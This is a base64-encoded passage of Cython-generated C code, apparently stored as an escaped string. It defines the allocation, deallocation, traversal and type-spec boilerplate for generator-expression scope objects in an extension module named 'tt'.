IgPiAwKSAmIF9fUFlYX0NIRUNLX0ZJTkFMX1RZUEVfRk9SX0ZSRUVMSVNUUyh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKSkpXG4gIHtcbiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl07XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgIFB5X0RFQ1JFRihQeV9UWVBFKG8pKTtcbiAgICAjZW5kaWZcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKTtcbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICh2b2lkKSBQeU9iamVjdF9Jbml0KG8sIHQpO1xuICAgICNlbHNlXG4gICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7XG4gICAgI2VuZGlmXG4gICAgUHlPYmplY3RfR0NfVHJhY2sobyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgIG8gPSBfX1B5eF9BbGxvY2F0ZUV4dGVuc2lvblR5cGUodCwgMSk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgcmV0dXJuIG87XG59XG5cbnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoUHlPYmplY3QgKm8pIHtcbiAgc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbztcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgaWYgKHVubGlrZWx5KF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHtcbiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSB7XG4gICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47XG4gICAgfVxuICB9XG4gICNlbmRpZlxuICBQeU9iamVjdF9HQ19VblRyYWNrKG8pO1xuICBQeV9DTEVBUihwLT5fX3B5eF9vdXRlcl9zY29wZSk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICBQeV9DTEVBUihwLT5fX3B5eF92X2kpO1xuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPCA4KSAmIF9fUFlYX0NIRUNLX0ZJTkFMX1RZUEVfRk9SX0ZSRUVMSVNUUyhQeV9UWVBFKG8pLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKSkpXG4gIHtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUobyk7XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICgqdHAtPnRwX2ZyZWUpKG8pO1xuICAgICNlbHNlXG4gICAge1xuICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdCh0cCwgUHlfdHBfZnJlZSk7XG4gICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgIFB5X0RFQ1JFRih0cCk7XG4gICAgI2VuZGlmXG4gIH1cbn1cblxuc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHtcbiAgaW50IGU7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKW87XG4gIHtcbiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpO1xuICAgIGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfb3V0ZXJfc2NvcGUpIHtcbiAgICBlID0gKCp2KSgoKFB5T2JqZWN0ICopcC0+X19weXhfb3V0ZXJfc2NvcGUpLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfdl9pKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfdl9pLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc2xvdHNbXSA9IHtcbiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcn0sXG4gIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX3B5eF90cF90cmF2ZXJzZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcn0sXG4gIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByfSxcbiAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMgPSB7XG4gICJ0dC5fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByIixcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpLFxuICAwLFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQyxcbiAgX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl9zbG90cyxcbn07XG4jZWxzZVxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgPSB7XG4gIFB5VmFyT2JqZWN0X0hFQURfSU5JVCgwLCAwKVxuICAidHQuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByIiwgXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSwgXG4gIDAsIFxuICBfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQywgXG4gIDAsIFxuICBfX3B5eF90cF90cmF2ZXJzZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIDAsIFxuICAjZW5kaWZcbiAgMCwgXG4gIDAsIFxuICBfX3B5eF90cF9uZXdfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICAwLCBcbiAgI2Vsc2VcbiAgTlVMTCwgXG4gICNlbmRpZlxuICAjaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDBcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykge1xuICBQeU9iamVjdCAqbztcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID4gMCkgJiBfX1BZWF9DSEVDS19GSU5BTF9UWVBFX0ZPUl9GUkVFTElTVFModCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkpKVxuICB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJdO1xuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgICBQeV9ERUNSRUYoUHlfVFlQRShvKSk7XG4gICAgI2VuZGlmXG4gICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSk7XG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAodm9pZCkgUHlPYmplY3RfSW5pdChvLCB0KTtcbiAgICAjZWxzZVxuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgICNlbmRpZlxuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gX19QeXhfQWxsb2NhdGVFeHRlbnNpb25UeXBlKHQsIDEpO1xuICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwO1xuICB9XG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseShfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikge1xuICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuO1xuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfb3V0ZXJfc2NvcGUpO1xuICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfdl9pKTtcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIDwgOCkgJiBfX1BZWF9DSEVDS19GSU5BTF9UWVBFX0ZPUl9GUkVFTElTVFMoUHlfVFlQRShvKSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSkpKVxuICB7XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG8pO1xuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAoKnRwLT50cF9mcmVlKShvKTtcbiAgICAjZWxzZVxuICAgIHtcbiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QodHAsIFB5X3RwX2ZyZWUpO1xuICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7XG4gICAgfVxuICAgICNlbmRpZlxuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgICBQeV9ERUNSRUYodHApO1xuICAgICNlbmRpZlxuICB9XG59XG5cbnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7XG4gIGludCBlO1xuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilvO1xuICB7XG4gICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTtcbiAgICBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X291dGVyX3Njb3BlKSB7XG4gICAgZSA9ICgqdikoKChQeU9iamVjdCAqKXAtPl9fcHl4X291dGVyX3Njb3BlKSwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X3ZfaSkge1xuICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfaSwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICByZXR1cm4gMDtcbn1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3Nsb3RzW10gPSB7XG4gIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJ9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJ9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sXG4gIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjID0ge1xuICAidHQuX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSxcbiAgMCxcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0MsXG4gIF9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc2xvdHMsXG59O1xuI2Vsc2Vcblxuc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgInR0LiIiX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciIsIFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciksIFxuICAwLCBcbiAgX19weXhfdHBfZGVhbGxvY18ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0MsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgMCwgXG4gICNlbHNlXG4gIE5VTEwsIFxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDBcbiAgMCwgXG4gICNlbmRpZlxufTtcbiNlbmRpZlxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHtcbiAgUHlPYmplY3QgKm87XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA+IDApICYgX19QWVhfQ0hFQ0tfRklOQUxfVFlQRV9GT1JfRlJFRUxJU1RTKHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpKSlcbiAge1xuICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByXTtcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgUHlfREVDUkVGKFB5X1RZUEUobykpO1xuICAgICNlbmRpZlxuICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpO1xuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgKHZvaWQpIFB5T2JqZWN0X0luaXQobywgdCk7XG4gICAgI2Vsc2VcbiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTtcbiAgICAjZW5kaWZcbiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgbyA9IF9fUHl4X0FsbG9jYXRlRXh0ZW5zaW9uVHlwZSh0LCAxKTtcbiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDtcbiAgfVxuICByZXR1cm4gbztcbn1cblxuc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeU9iamVjdCAqbykge1xuICBzdHJ1Y3QgX19weXhfb2JqXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilvO1xuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICBpZiAodW5saWtlbHkoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkge1xuICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIHtcbiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjtcbiAgICB9XG4gIH1cbiAgI2VuZGlmXG4gIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X291dGVyX3Njb3BlKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciA8IDgpICYgX19QWVhfQ0hFQ0tfRklOQUxfVFlQRV9GT1JfRlJFRUxJU1RTKFB5X1RZUEUobyksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eX